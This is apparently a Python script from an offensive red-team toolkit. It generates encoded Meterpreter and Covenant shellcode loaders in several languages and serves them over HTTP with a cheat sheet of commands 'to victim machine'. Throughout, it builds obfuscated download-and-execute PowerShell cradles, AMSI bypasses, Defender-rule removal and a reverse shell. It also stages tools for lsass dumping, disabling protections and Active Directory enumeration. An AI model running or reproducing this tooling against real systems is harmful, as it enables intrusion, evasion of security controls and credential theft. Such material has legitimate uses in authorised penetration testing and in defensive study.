import os
import json
import time
import glob
import shutil
import platform
import requests
import tempfile
import argparse

try:
    # python 2
    from SimpleHTTPServer import SimpleHTTPRequestHandler
    from BaseHTTPServer import HTTPServer as BaseHTTPServer
except ImportError:
    # python 3
    from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler

from random import choice
from base64 import b64encode, b64decode
import TempUtil
from workload import Manager as WLManager

def psb64e(data):
    if isinstance(data, bytes):
        data = data.decode()
    return b64encode(data.encode('UTF-16LE')).decode()

class Cipher:
    def __init__(self, key):
        self.key = key
        self.init()
    def init(self):
        pass
    def run(self, buf):
        return buf
    def rev(self, buf):
        return buf

class Caesar(Cipher):
    def init(self):
        self.key = int(self.key)
    def run(self, buf):
        return bytearray(((_+self.key) & 0xFF) for _ in buf)
    def rev(self, buf):
        return bytearray(((_-self.key) & 0xFF) for _ in buf)

class XorCipher(Cipher):
    def run(self, buf):
        return bytearray(((buf[i]^ord(self.key[i % len(self.key)])) & 0xFF) for i in range(len(buf)))
    def rev(self, buf):
        return bytearray(((buf[i]^ord(self.key[i % len(self.key)])) & 0xFF) for i in range(len(buf)))

class Base64Encoder(Cipher):
    def init(self):
        self.key = int(self.key)
    def run(self, buf):
        for i in range(self.key):
            buf = b64encode(bytearray(buf))
        return buf
    def rev(self, buf):
        for i in range(self.key):
            buf = b64decode(buf)
        return buf

class ComboCipher(Cipher):
    def init(self):
        assert isinstance(self.key, list)
    def add(self, _cipher):
        self.key.append(_cipher)
    def clear(self):
        self.key = []
    def run(self, buf):
        for _cipher in self.key:
            buf = _cipher.run(buf)
        return buf
    def rev(self, buf):
        for _cipher in reversed(self.key):
            buf = _cipher.rev(buf)
        return buf

ciphers = {
    'cae': Caesar,
    'xor': XorCipher,
    'b64': Base64Encoder,
}

class Chain:

    '''
    chain format
      xor-100-cae-treree-cae-kadmw-xor-200
      > xor(cae(cae(xor($buf, 100), 'treree'), 'kadmw'), 200)
    '''

    def __init__(self, expression=None):
        self.support_langs = ['powershell', 'csharp', 'python', 'vba', 'c']
        self.chain = self.parse(expression)
        print('[+] Encoding Chain: \n\t' + ' => '.join('%s(%s)' % (fn, k) for (fn, k) in self.chain))

    def parse(self, expr):
        if expr is None:
            return []
        for seg in expr.split('-')[::2]:
            if not hasattr(self, 'do_' + seg):
                raise Exception("transformer 'do_%s' not implemented" % seg)
        segments = expr.split('-')
        assert len(segments) % 2 == 0
        pairs = [(segments[2*i], segments[2*i+1]) for i in range(len(segments)//2)]
        return pairs

    def getCipher(self):
        _c = Cipher(None)
        if len(self.chain) == 0:
            return _c
        _c = ComboCipher([])
        for (fn, key) in self.chain:
            _c.add(ciphers[fn](key))
        return _c

    # decode routine
    def transform(self, lang='powershell', var='buf'):
        if lang not in self.support_langs:
            raise Exception("Not Implemented")
        buf = ''
        if len(self.chain) == 0:
            return buf
        for (fn, key) in reversed(self.chain):
            buf += getattr(self, 'do_%s' % fn)(var, key, lang)
        return buf

    def do_xor(self, var, key, lang):
        return {
            'powershell': '$%(v)s = xor $%(v)s "%(k)s";',
            'csharp': '%(v)s = xor(%(v)s, "%(k)s");',
            'python': '%(v)s = xor(%(v)s, "%(k)s");',
            'vba': '%(v)s = rox(%(v)s, "%(k)s")\n',
            'c': 'xor(%(v)s, tmpSize, "%(k)s", strlen("%(k)s"));\n',
        }[lang] % dict(v=var, k=key)

    def do_cae(self, var, key, lang):
        return {
            'powershell': '$%(v)s = cae $%(v)s %(k)d;',
            'csharp': '%(v)s = cae(%(v)s, %(k)d);',
            'python': '%(v)s = cae(%(v)s, %(k)d);',
            'vba': '%(v)s = cae(%(v)s, %(k)d)\n',
            'c': 'cae(%(v)s, tmpSize, %(k)d);\n',
        }[lang] % dict(v=var, k=int(key))

    def do_b64(self, var, key, lang):
        return {
            'powershell': '$%(v)s = b64 $%(v)s %(k)d;',
            'csharp': '%(v)s = b64(%(v)s, %(k)d);',
            'python': '%(v)s = b64(%(v)s, %(k)d);',
            'vba': '%(v)s = b64(%(v)s, %(k)d)\n',
            'c': 'for(int i=0; i<%(k)d; i++) {%(v)s = base64_decode(%(v)s, tmpSize, &tmpSize);}\n',
            'c2': 'for(int i=0; i<%(k)d; i++) {%(v)s = base64_decode(%(v)s, tmpSize, &tmpSize); %(v)s[tmpSize] = \'\\0\';}\n',
        }[lang] % dict(v=var, k=int(key))

def fit(template_str, varmap):
    for k, v in varmap.items():
        template_str = template_str.replace('%'+k+'%', v)
    return template_str

class HTTPHandler(SimpleHTTPRequestHandler):
    """This handler uses server.base_path instead of always using os.getcwd()"""
    def translate_path(self, path):
        path = SimpleHTTPRequestHandler.translate_path(self, path)
        relpath = os.path.relpath(path, os.getcwd())
        fullpath = os.path.join(self.server.base_path, relpath)
        return fullpath

class HTTPServer(BaseHTTPServer):
    """The main server, you pass in base_path which is the path you want to serve requests from"""
    def __init__(self, base_path, server_address, RequestHandlerClass=HTTPHandler):
        self.base_path = base_path
        BaseHTTPServer.__init__(self, server_address, RequestHandlerClass)


def handleVBALongStr(payload, varname):
    _, lines, width = '', [], 1000
    for i in range(0, len(payload), width):
        lines.append('%(v)s = %(v)s & "%(p)s"' % dict(v=varname, p=payload[i:i+width]))
        _ = ''
    payload = '%(v)s = ""\n%(c)s' % dict(v=varname, c='\n'.join(lines))
    return payload

# Invoke Obfuscation?
# docker run --rm -it -v $PWD:/mnt --entrypoint pwsh -v /home/parallels/scripts/Invoke-Obfuscation/Out-EncodedBXORCommand.ps1:/mnt/0.ps1:ro -v /home/parallels/scripts/Invoke-Obfuscation/Out-PowerShellLauncher.ps1:/mnt/1.ps1:ro  powershell /mnt/myexp.ps1 >out.ps1
# need solve some error OTZ
POWERSPLOIT = os.path.abspath('../PowerSploit-master/ScriptModification/Remove-Comment.ps1')
def remove_pscomment(fpath):
    _ = os.path.basename(fpath)
    if os.path.exists(os.path.join('common-ps1', _)):
        return os.path.join('common-ps1', _)
    return fpath # weird in kali
    import docker
    fpath = os.path.abspath(fpath)
    client = docker.from_env()
    cleanPS = client.containers.run('mcr.microsoft.com/powershell', 
            'pwsh -ep bypass -c "ipmo /1.ps1; Remove-Comment /0.ps1"', remove=True, \
            volumes={fpath: dict(bind='/0.ps1', mode='ro'), POWERSPLOIT: dict(bind='/1.ps1', mode='ro')})
    if len(cleanPS) == 0:
        print('Error occur in Remove-Comment "%s"' % fpath)
        return fpath
    with open(os.path.join('common-ps1', _), 'wb') as f:
        f.write(cleanPS)
    return TempUtil.getBytesName(cleanPS)

parser = argparse.ArgumentParser(description="Python Shellcode Runner")
parser.add_argument('-a', '--os', default='win', help="Choose OS", choices=['win', 'nix'])
parser.add_argument('-b', '--bits', default=64, type=int, help="Choose process bits", choices=[32, 64])
parser.add_argument('-n', '--netclr', default=4, type=int, help="Choose .NET CLR version", choices=[2, 4])
parser.add_argument('-i', '--ip', required=True, help='HTTP Listener IP')
parser.add_argument('-p', '--port', required=True, type=int, help="HTTP Listener Port")
parser.add_argument('-P', '--rport', required=True, type=int, help="msf Listener Port")
parser.add_argument('-r', '--revport', required=False, type=int, help="NC Listener Port")
parser.add_argument('-gP', '--gport', required=False, type=int, help="grunt Listener Port")
parser.add_argument('--payload', default='meterpreter/reverse_https', help='meterpreter payload used')
parser.add_argument('--inject', default='', help='target process to inject')
parser.add_argument('--chome', type=str, help='Covenant home directory')
parser.add_argument('--mhome', dest='msf_workdir', default='../metasploit/', type=str, help='Metasploit Custom Meterpreter Scripts directory.')
parser.add_argument('--ps1', help='path to custom powershell script')
parser.add_argument('--chain', help='''payload transform expression, separated by "-"
Ex.
    xor-ii1e12e1 => xor($buf, 'ii1e12e1')
    xor-eegg-cae-10 => cae(xor($buf, 'eegg'), 10)
''')
parser.add_argument('--stageless', action='store_true', help='create stageless payload (no interact with this http server)')
parser.add_argument('--csc', type=str, default='csc', help='C# compiler command')
parser.add_argument('--gcc', type=str, default='x86_64-linux-gnu-gcc-11' if platform.uname().machine == 'aarch64' else 'gcc', help='C# compiler command')
args = parser.parse_args()

if args.inject.endswith('.exe'):
    print('trim ".exe" in --inject')
    args.inject = args.inject[:-len('.exe')]

if args.payload == 'meterpreter/reverse_https' and args.os == 'nix':
    args.payload = 'meterpreter/reverse_tcp'
    print('[-] Auto change to %s due to linux' % args.payload)

chain = Chain(args.chain)
encFn = chain.getCipher().run
decFn = chain.getCipher().rev

playground = 'gg'
if os.path.exists(playground):
    print('[+] clean up First')
    shutil.rmtree(playground)
os.makedirs(playground)

_os = 'windows' if args.os == 'win' else 'linux'
platform = 'x64' if args.bits == 64 else 'x86'
netclr = 'v4.0' if args.netclr == 4 else 'v2.0'
args.payload = '/'.join([_os, platform, args.payload])
httpUrl = 'http://%s:%s' % (args.ip, args.port)

TempUtil.setUrl(httpUrl)
TempUtil.setPrefix('setting.')
TempUtil.setTempDir(playground)

print('[+] generating shellcode...')
gen_options = dict(ip=args.ip, port=args.rport, o='raw')
#if args.chain is not None:
#    gen_options['chain'] = args.chain
# chain in this script is enough :)
res = requests.get('http://127.0.0.1:8787/' + args.payload, params=gen_options)
assert res.status_code == 200
shellcode_url = TempUtil.getBytesUrl(res.content, encFn)
gen_options['o'] = 'dll'
res = requests.get('http://127.0.0.1:8787/' + args.payload, params=gen_options)
assert res.status_code == 200
metdll_url = TempUtil.getBytesUrl(res.content, encFn)
# switch to stageless metasploit payload
#if 'meterpreter/' in args.payload:
#    gen_options['o'] = 'raw'
#    args.payload = args.payload.replace('meterpreter/', 'meterpreter_')
#    res = requests.get('http://127.0.0.1:8787/' + args.payload, params=gen_options)
#    assert res.status_code == 200
#    stageless_exe_url = TempUtil.getBytesUrl(res.content, encFn)

if args.chome:
    import Covenant
    Covenant.init('https://127.0.0.1:7443', args.chome)
    Covenant.login('tree', 'treetree')
    covListenerId = Covenant.listen(args.ip, args.gport, ssl=True)

    data = Covenant.generateShellcode(covListenerId, platform)
    shellcode_url_grunt = TempUtil.getBytesUrl(data, encFn)

with open('appSetting.json') as f:
    app = json.load(f)

ubp = 'usebasicparsing'
ubp = ''.join(choice([str.lower, str.upper])(_) for _ in ubp)

# Bypass technique
# 1. amsibypass
noAmsi = TempUtil.getFileName(app['bypass']['ps-amsi']['filename'])
_noAmsi = os.path.basename(noAmsi)

# 2. clear defender rule
noDef = TempUtil.getFileName(app['bypass']['defender-1']['filename'])
_noDef = os.path.basename(noDef)


wlmgr = WLManager(_stageless=args.stageless, tempUtil=TempUtil)
wlmgr.add('Powershell AMSI Bypass', 'noAmsi', 'iWr -%s %s/%s | `i`Ex' % (ubp, httpUrl, _noAmsi))
wlmgr.add('Clean Defender Rule', 'cleanDef', 'iWr -%s %s/%s | `I`eX' % (ubp, httpUrl, _noDef))

# getFileUrl(, encFn) + needTransform=True
# getFileUrl(,) + needTransform=False
# Warning: useTransform flag can not be used with Powershell ConstrainLanguageMode
def pandora(Tname, shellUrl=shellcode_url, Tvar=None, desc=None, pscmdType='raw', preCode='', postCode='', record=True, useTransform=True, FILENAME=None):
    _ = Tvar or {}
    _Tvar = _.copy()
    _shell_length = TempUtil.getUrlSize(shellUrl, decFn)

    Tinfo = app['template'][Tname]
    if _os != 'linux' and Tinfo.get('platform') == 'linux':
        print('skip Linux specific payload "%s"' % Tname)
        return

    Tcode = open(Tinfo['filename'], 'r').read()
    Cinfo = app['cradle'][Tinfo['lang']]
    _Tvar['libtransform'] = open(app['libtransform'][Tinfo['lang']], 'r').read()
    _Tvar['code'] = dict(var='buf', url=shellUrl, preCode=preCode, postCode=postCode)
    for k in _Tvar:
        if k in ['size']:
            print('Error: template varible "%%%s%%" is a reserved word.' % k)
            exit(1)
        if not isinstance(_Tvar[k], dict):
            continue
        assert 'url' in _Tvar[k]
        assert 'var' in _Tvar[k], "custom variable name is required"
        _def = Cinfo['def'].replace('buf', _Tvar[k]['var'])
        if not args.stageless and 'staged' not in Cinfo:
            print('Warning: specify staged but "%s" don\'t implement it' % Tname)
        elif args.stageless and 'stageless' not in Cinfo:
            print('Warning: specify stageless but "%s" don\'t implement it' % Tname)

        if args.stageless or 'staged' not in Cinfo:
            payload = b64encode(TempUtil.getUrlBytes(_Tvar[k]['url'])).decode()
            if Tinfo['lang'] == 'vba': # max char in line (1023)
                payload = handleVBALongStr(payload, _Tvar[k]['var'])

            expr = (Cinfo.get('preCode', {}).get('stageless', '') + _def + Cinfo['stageless']) % dict(payload=payload)
        else:
            expr = (Cinfo.get('preCode', {}).get('staged', '') + _def + Cinfo['staged']) % dict(url=_Tvar[k]['url'])
        transCode = chain.transform(lang=Tinfo['lang'], var=_Tvar[k]['var']) if useTransform else ''
        _Tvar[k] = '\n'.join((_Tvar[k].get('preCode', ''), expr, transCode, _Tvar[k].get('postCode', '')))

    _Tvar['size'] = hex(max(_shell_length, 0x1000))

    _filename = TempUtil.getBytesName(fit(Tcode, _Tvar).encode())

    if Tinfo['lang'] == 'powershell':

        # encode network traffic of main
        if Tname != 'custom-ps' and useTransform:
            _filename = pandora('custom-ps', shellUrl=TempUtil.getFileUrl(_filename, encFn), pscmdType='enc', \
                    postCode='[System.Text.Encoding]::ASCII.GetString($buf) | `i`E`x;', record=False)
        if FILENAME is not None:
            _FILENAME = os.path.join(TempUtil.getTempDir(), FILENAME)
            shutil.move(_filename, _FILENAME)
            _filename = _FILENAME
        filename = os.path.basename(_filename)

        command = 'iWr -%(ubp)s %(base)s/%(main)s | i`e`X' % dict(ubp=ubp, base=httpUrl, main=filename)
        if pscmdType == 'enc': # amsifail & clean Defender & encodedcommand
            _command = ''
            for module in ['noAmsi', 'cleanDef']:
                _command += wlmgr.getCmd(desc2=module) + ';'
            command = 'powershell -enc ' + psb64e(_command + command)
    else:
        if FILENAME is not None:
            _FILENAME = os.path.join(TempUtil.getTempDir(), FILENAME)
            shutil.move(_filename, _FILENAME)
            _filename = _FILENAME
        filename = os.path.basename(_filename)
        command = 'curl %(base)s/%(f)s' %  dict(base=httpUrl, f=filename)
        if 'exe' in Tinfo:
            references = Tinfo.get('references', [])
            #references.append('../dlls/%(ver)s/mscorlib.dll')

            # DEBUGGING
            monoroot = '/usr/lib/mono/%s-api/' % netclr[1:]
            references.append(monoroot + 'System.Configuration.Install.dll')
            # 
            ref = ' '.join('/r:'+x for x in references) % dict(ver=netclr)
            # In Kali, mono-devel seems not detect reference?!
            compile_cmd = '%s /sdk:%s /platform:%s /out:%s.exe /optimize /target:exe %s /unsafe %s 2>/dev/null' % (args.csc, float(netclr[1:]), platform, _filename, ref, _filename)
            #compile_cmd = '%s /platform:%s /out:%s.exe /target:exe %s /nostdlib /unsafe %s' % (args.csc, platform, _filename, ref, _filename)
            #print(compile_cmd)
            
            os.system(compile_cmd)
            if os.path.exists(_filename+'.exe'):
                command += '\ncurl %(base)s/%(f)s.exe' % dict(base=httpUrl, f=filename)
        elif 'elf' in Tinfo:
            # compile for windows?
            compile_cmd = '%s -x c -z execstack -fno-stack-protector %s -o %s.elf' % (args.gcc, _filename, _filename)
            os.system(compile_cmd)
            if os.path.exists(_filename+'.elf'):
                command += '\ncurl %(base)s/%(f)s.elf' % dict(base=httpUrl, f=filename)

    if record:
        wlmgr.add(Tinfo['description'], desc, command)
    return _filename

# easy-to-use-utility
def simple(filepath, desc=None):
    desc = desc or filepath
    command = 'curl %s' % TempUtil.getFileUrl(filepath)
    wlmgr.add('[Simple] %s' % desc, '', command)

def c_exe(filepath, desc, _type='enc', _args='$null'):
    # TODO: _args
    pandora('ps-2', pscmdType=_type, shellUrl=TempUtil.getFileUrl(filepath, encFn), Tvar=dict(inject_name=args.inject, \
            import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
            postCode='[System.Text.Encoding]::ASCII.GetString($ii) | `i`e`x; $exeArgs=%s;' % _args)), desc=desc)

def cs_exe(filepath, desc, classname=None, funcname=None):
    _func = os.path.splitext(os.path.basename(filepath))[0]
    classname = classname or ('%s.Program' % _func)
    funcname = funcname or ('Invoke-%s' % _func)
    pandora('load-exe-1', shellUrl=TempUtil.getFileUrl(filepath, encFn), desc=desc, Tvar={
        'class': classname,
        'function': funcname
    })

def ez_fit(filepath, **tvar):
    for k in tvar:
        if not isinstance(tvar[k], str):
            tvar[k] = str(tvar[k])
    Tcode = open(filepath, 'r').read()
    return fit(Tcode, tvar).encode()

# ===================

# TODO: separate msf / Covenant / Empire
pandora('py-1', postCode=('run(buf)' if args.os == 'win' else 'write_linux(buf)'), desc='py-1')
pandora('ps-1', desc='ps-1')
pandora('ps-1', pscmdType='enc')
#pandora('ps-2', pscmdType='enc', shellUrl=metdll_url, Tvar=dict(inject_name=args.inject, \
#        import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
#        postCode='[System.Text.Encoding]::ASCII.GetString($ii)|iex')))
pandora('aspx-1', Tvar=dict(inject_name=args.inject))
pandora('cs-1', Tvar=dict(inject_name=args.inject))
pandora('cs-2')
pandora('cs-3')
pandora('vb-1')

cs_exe('Rubeus.exe', 'Rubeus')
cs_exe('SpoolSample.exe', 'SpoolSample', 'SpoolSample.SpoolSample')
cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
        'myPsExec.Program', 'Invoke-mPsExec')
#cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n', 'SQL.SQL')
cs_exe('SharpHound.exe', '[SharpHound.Program]::Main(@("-c", "All,GPOLocalGroup", "--outputdirectory", "$env:tmp", "-s"))', 
        'SharpHound.Program', 'Invoke-Bloodhound')

c_exe('StopDefender.exe', 'StopDefender')
#c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')

for huan_exe in glob.glob('./artifact/*.exe'):
    simple(huan_exe, os.path.basename(huan_exe))

# Map Failed when using Invoke-RPEI
#c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='raw')
#c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='enc')
simple('../PPLDump.exe', 'PPLDump.exe')
simple('../SysinternalsSuite/PsExec.exe', 'PsExec.exe')
simple('linikatz.sh')
simple('BackStab.exe')
simple('PPLKiller.exe')

pandora('c-1')
pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')

pandora('ppl-1', Tvar=dict(pplkiller_dl=wlmgr.getCmd(desc1='[Simple] PPLKiller.exe')), useTransform=False, FILENAME='pk.ps1')

if args.revport:
    data = ez_fit('reverse/rev.ps1', ip=args.ip, port=args.revport)
    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc='rev-ps')

    if netclr == 'v4.0' and _os == 'windows':
        command = ';'.join(wlmgr.getCmd(desc2=m) for m in ['noAmsi', 'rev-ps'])
        pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='rev.ps1', desc='rev-ps-bypass')


if netclr == 'v4.0' and _os == 'windows':
    pandora('installutil-1')
    pandora('installutil-2', Tvar=dict(psfile='e.ps1'))
    pandora('installutil-4', useTransform=False, FILENAME='flm.ps1')

    _command = ''
    for module in ['noAmsi', 'cleanDef']:
        _command += wlmgr.getCmd(desc2=module) + ';'
    command = _command + wlmgr.getCmd(desc2='ps-1')
    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='go.ps1') # TODO: amsi might need invoke first in stageless mode
    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, pscmdType='enc', FILENAME='go.ps1')
    pandora('service-1', Tvar=dict(psraw=command), useTransform=False, FILENAME='svc.ps1')
    pandora('service-2', useTransform=False, FILENAME='svc_.ps1')
    pandora('msbuild-1', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='gm.ps1') # TODO: amsi might need invoke first in stageless mode
    pandora('psexec-1', useTransform=False)

for common_psmodule in app['common-pstool']:
    c = ''
    _record = not common_psmodule.get('hidden', False)
    for dep in common_psmodule.get('dependency', list()):
        c += wlmgr.getCmd(desc2=dep) + ';'
    common_psmodule['filepath'] = remove_pscomment(common_psmodule['filepath'])
    data = ez_fit(common_psmodule['filepath'], dependency=c)
    pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc=common_psmodule['name'])



if args.ps1:
    cUrl = TempUtil.getFileUrl(args.ps1, encFn)
    pandora('custom-ps', shellUrl=cUrl, pscmdType='enc', \
            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;')

if args.chome:
    pandora('py-1', postCode=('run(buf)' if args.os == 'win' else 'write_linux(buf)'), shellUrl=shellcode_url_grunt, desc='Grunt')
    pandora('cs-1', Tvar=dict(inject_name=args.inject), shellUrl=shellcode_url_grunt, desc='Grunt')
    pandora('cs-2', shellUrl=shellcode_url_grunt, desc='Grunt')
    pandora('ps-1', pscmdType='enc', shellUrl=shellcode_url_grunt, desc='Grunt')
    pandora('vb-1', shellUrl=shellcode_url_grunt, desc='Grunt')

# metasploit custom meterpreter script
if args.msf_workdir:
    # put noAmsi, Rubeus into win_getTGT.rc
    # maybe. Load amsibypass, Load Rubeus, EXEC Rubeus?
    # ref: /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/powershell.rb
    # copy iex ... to $msf_workdir/noamsi.rc
    if _os == 'windows':
        psT = 'powershell_execute \'%s\''
        for o in ['noAmsi', 'Rubeus']:
            with open(os.path.join(args.msf_workdir, o.lower() + '.rc'), 'w') as f:
                f.write(psT % wlmgr.getCmd(desc2=o))
        #if args.revport:
        #    execT = 'execute -H -f powershell -a \'-ep bypass -c "%s"\''
        #    #execT = '$c = client.sys.process.execute("c:\\windows\\system32\\cmd.exe", \'/c powershell -ep bypass -c "%s"\', nil); $c.close'
        #    for o in ['rev-ps-bypass']:
        #        with open(os.path.join(args.msf_workdir, o.lower() + '.rc'), 'w') as f:
        #            f.write((execT % wlmgr.getCmd(desc2=o)).replace('\\', '\\\\'))

oBanner = '''Put following command to victim machine

C payload transformer
\tcurl "http://127.0.0.1:8787/%(payload)s?ip=%(ip)s&port=%(rport)s&chain=%(chain)s&o=c"
''' % dict(ip=args.ip, port=args.port, rport=args.rport, payload=args.payload, chain=args.chain)

wlmgr.sort()
print(oBanner)
print(wlmgr)
wlmgr.export_cheatsheet()

try:
    print('Serving HTTP on %(ip)s port %(port)d (http://%(ip)s:%(port)d/) ...' % dict(ip=args.ip, port=args.port))
    print('press ^C to stop')
    web_dir = os.path.join(os.path.dirname(__file__), playground)
    try:
        httpd = HTTPServer(web_dir, (args.ip, args.port))
    except OSError:
        print('Bind to "%s" failed. Fall back to http://0.0.0.0:%d/' % (args.ip, args.port))
        httpd = HTTPServer(web_dir, ('0.0.0.0', args.port))

    httpd.serve_forever()

except KeyboardInterrupt:
    print('Control C')

print('[+] clean up Last')
if os.path.exists(playground):
    shutil.rmtree(playground)
wlmgr.remove_cheatsheet()
